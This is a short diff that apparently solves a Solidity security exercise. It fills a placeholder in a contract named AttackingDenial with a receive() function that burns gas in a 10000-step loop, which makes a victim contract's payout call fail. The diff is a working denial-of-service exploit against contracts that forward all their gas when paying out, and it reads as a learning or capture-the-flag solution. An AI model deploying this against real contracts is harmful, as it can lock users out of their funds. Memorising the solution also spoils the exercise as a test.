@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive() external payable {
+        uint wastingGas = 1;
+        for (uint i=0; i<10000; i++) {
+            wastingGas = wastingGas + i;
+        }
+    }
 }
